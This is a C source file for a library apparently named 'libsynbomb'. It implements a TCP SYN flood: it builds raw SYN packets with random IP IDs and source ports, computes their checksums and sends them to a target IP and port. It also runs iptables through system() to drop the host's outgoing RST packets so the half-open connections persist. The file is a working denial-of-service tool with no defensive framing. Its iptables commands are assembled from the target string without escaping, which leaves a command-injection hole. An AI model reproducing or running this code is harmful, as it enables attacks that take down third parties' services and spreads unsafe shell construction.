#include "syn_bomb.h"
#include "syn_bomb-private.h"

/*
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |   ______     | || | _____  _____ | || |   ______     | || |   _____      | || |     _____    | || |     ______   | |
| |  |_   __ \   | || ||_   _||_   _|| || |  |_   _ \    | || |  |_   _|     | || |    |_   _|   | || |   .' ___  |  | |
| |    | |__) |  | || |  | |    | |  | || |    | |_) |   | || |    | |       | || |      | |     | || |  / .'   \_|  | |
| |    |  ___/   | || |  | '    ' |  | || |    |  __'.   | || |    | |   _   | || |      | |     | || |  | |         | |
| |   _| |_      | || |   \ `--' /   | || |   _| |__) |  | || |   _| |__/ |  | || |     _| |_    | || |  \ `.___.'\  | |
| |  |_____|     | || |    `.__.'    | || |  |_______/   | || |  |________|  | || |    |_____|   | || |   `._____.'  | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
 */


/**
 * [libsynbomb_service description]
 * @param this [description]
 */
void libsynbomb_service(struct syn_bomb *this)
{
	int ip_id_ramdom, 
		src_port_random,
		one = 1,
		psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
	char datagram[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0}; 	//Datagram to represent the packet
	struct sockaddr_in sin;
    struct pseudo_header psh;
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));

	/* create a raw socket for usage of sending SYN datagram. */
	int socket_raw = socket (PF_INET, SOCK_RAW, ETH_P_IP);
	if (setsockopt (socket_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof (one)) < 0)
	{
		perror("Error setting IP_HDRINCL");
		exit(1);
	}

	/* pseudogram is use to calculate TCP header checksum. */
	char *pseudogram = calloc(1, psize);
	if ( pseudogram == NULL) {
		perror("pseudogram allocate memory error");
		exit(1);
	}

	libsynbomb_initPsh(&psh, this);	// init struct psh

	memset( &sin, 0 ,sizeof(sin));
	sin.sin_family = PF_INET;
    sin.sin_addr.s_addr = inet_addr (this->target_ip);
	
	//* using time to make a random table.*/
	// srand(time(NULL));

	//* use random src ip_id and src port number*/
	ip_id_ramdom = RANDOM_START + (rand() % RANDOM_MAX);
	src_port_random = RANDOM_START + (rand() % RANDOM_MAX);

	/* setup SYN datagram. */
	memset( datagram, 0, sizeof(datagram));
	memset( pseudogram, 0, psize);
	memcpy( pseudogram , (char*) &psh , sizeof (struct pseudo_header));

	libsynbomb_setSYNDatagram(datagram,
							 sizeof(datagram), 
							 this, 
							 ip_id_ramdom,
							 src_port_random,
							 pseudogram,
							 psize);
	
	sin.sin_port = htons( this->target_port );
	if (sendto (socket_raw, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
	{
		perror("sendto failed");
	}


	close(socket_raw);
	free(pseudogram);
	usleep(1000);
}

/**
 * [libsynbomb_init description]
 * @param this       [description]
 * @param localIP    [description]
 * @param targetIP   [description]
 * @param targetPort [description]
 */
void libsynbomb_init(struct syn_bomb *this, char *localIP, char *targetIP, int targetPort)
{
	if ( localIP == NULL)
		this->local_ip = libsynbomb_getLocalIP();
	else
		this->local_ip = localIP;

	this->target_ip = targetIP;
	this->target_port = targetPort;
	this->need_to_free = 0;
	this->service = libsynbomb_service;

	srand(time(NULL));
	libsynbomb_setIptables(this);
	return;
}

/**
 * [libsynbomb_create description]
 * @param  localIP    [description]
 * @param  targetIP   [description]
 * @param  targetPort [description]
 * @return            [description]
 */
struct syn_bomb *libsynbomb_create(char *localIP, char *targetIP, int targetPort)
{
	struct syn_bomb *sb = calloc(1, sizeof(struct syn_bomb));

	if ( localIP == NULL)
		sb->local_ip = libsynbomb_getLocalIP();
	else
		sb->local_ip = localIP;

	sb->target_ip = targetIP;
	sb->target_port = targetPort;
	sb->need_to_free = 1;
	sb->service = libsynbomb_service;

	srand(time(NULL));
	libsynbomb_setIptables(sb);
	return sb;
}

/**
 * [libsynbomb_clean description]
 */
void libsynbomb_clean(struct syn_bomb *this)
{
	char iptable_str[IPTABLES_STR_LEN]={0};
	strcpy(iptable_str, "iptables -D OUTPUT -o eth0 -d ");
	strcat(iptable_str, this->target_ip);
	strcat(iptable_str, " -p tcp --tcp-flags SYN,ACK,FIN,RST RST -j DROP");


	/* Delay for 1ms. */
	usleep(1000);

	printf(KYEL_L"Removing iptables: %s"RESET"\n", iptable_str);
	system(iptable_str);

	if (this->need_to_free == 1)
		free(this);
	return;
}


/*
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |   ______     | || |  _______     | || |     _____    | || | ____   ____  | || |      __      | || |  _________   | || |  _________   | |
| |  |_   __ \   | || | |_   __ \    | || |    |_   _|   | || ||_  _| |_  _| | || |     /  \     | || | |  _   _  |  | || | |_   ___  |  | |
| |    | |__) |  | || |   | |__) |   | || |      | |     | || |  \ \   / /   | || |    / /\ \    | || | |_/ | | \_|  | || |   | |_  \_|  | |
| |    |  ___/   | || |   |  __ /    | || |      | |     | || |   \ \ / /    | || |   / ____ \   | || |     | |      | || |   |  _|  _   | |
| |   _| |_      | || |  _| |  \ \_  | || |     _| |_    | || |    \ ' /     | || | _/ /    \ \_ | || |    _| |_     | || |  _| |___/ |  | |
| |  |_____|     | || | |____| |___| | || |    |_____|   | || |     \_/      | || ||____|  |____|| || |   |_____|    | || | |_________|  | |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
 */


/*
    Generic checksum calculation function
*/
static unsigned short libsynbomb_csum(unsigned short *ptr, int nbytes) 
{
    register long sum = 0;
    unsigned short oddbyte = 0;
    register short answer = 0;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

/**
 * This function can get the local IPv4 address.
 * @return IPv4 address in text form.
 */
static char *libsynbomb_getLocalIP ()
{
	int tmp_sock;
	struct ifreq ifr;

	tmp_sock = socket( PF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

	ioctl ( tmp_sock, SIOCGIFADDR, &ifr);

	close(tmp_sock);

	/* return result */
	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

/**
 * This function do the initial struct pseudo_header.
 * @param psh       target structure memory address.
 * @param source_ip source ip in string form.
 */
static void libsynbomb_initPsh (struct pseudo_header *psh, struct syn_bomb *this)
{
	psh->source_address = inet_addr( this->local_ip );
    psh->dest_address = inet_addr( this->target_ip );
    psh->placeholder = 0;
    psh->protocol = IPPROTO_TCP;
    psh->tcp_length = htons(sizeof(struct tcphdr));

    return;
}

/**
 * setSYNDatagram: 
 * @param datagram      TCP datagram.
 * @param datagram_size datagram size.
 * @param src_ip        source ip address in string.
 * @param id_in         Identification slot in IP header.
 * @param src_port      source port in TCP header.
 * @param dst_port      destination port in TCP header.
 * @param pseudogram    pseudogram is used to calculate TCP header.
 * @param psize         pseudogram size.
 */
static void libsynbomb_setSYNDatagram(char *datagram,
							 int datagram_size,
							 struct syn_bomb *this,
							 int id_in,
							 int src_port,
							 char *pseudogram,
							 int psize
							  )
{
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));

	/*
		IP header setup
	 */
	iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    iph->id = htons(id_in); //Id of this packet
    iph->frag_off = htons(IP_DF);
    iph->ttl = 255;	// IP TTL
    iph->protocol = IPPROTO_TCP;	//Protocol use TCP
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( this->local_ip );	//convert source_ip from string to uint32_t
    iph->daddr = inet_addr ( this->target_ip );	//convert target_ip from string to uint32_t

	/*
		TCP header setup
	 */
	tcph->dest = 0;	// tcp dest port
	tcph->source = htons(src_port);
	tcph->dest = htons(this->target_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;  //tcp header size
    tcph->fin=0;
    tcph->syn=1;	//SYN flag
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;

    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr));

	// calculate ip header checksum
	iph->check = libsynbomb_csum ((unsigned short *) iph, iph->tot_len);

	// calculate tcp header checksum
	tcph->check = libsynbomb_csum( (unsigned short*) pseudogram , psize);
}

static inline void libsynbomb_setIptables(struct syn_bomb *this)
{
	char iptable_str[IPTABLES_STR_LEN]={0};
	strcpy(iptable_str, "iptables -A OUTPUT -o eth0 -d ");
	strcat(iptable_str, this->target_ip);
	strcat(iptable_str, " -p tcp --tcp-flags SYN,ACK,FIN,RST RST -j DROP");

	printf(KYEL_L"Appending iptables: %s"RESET"\n", iptable_str);
	system(iptable_str);
	return;
}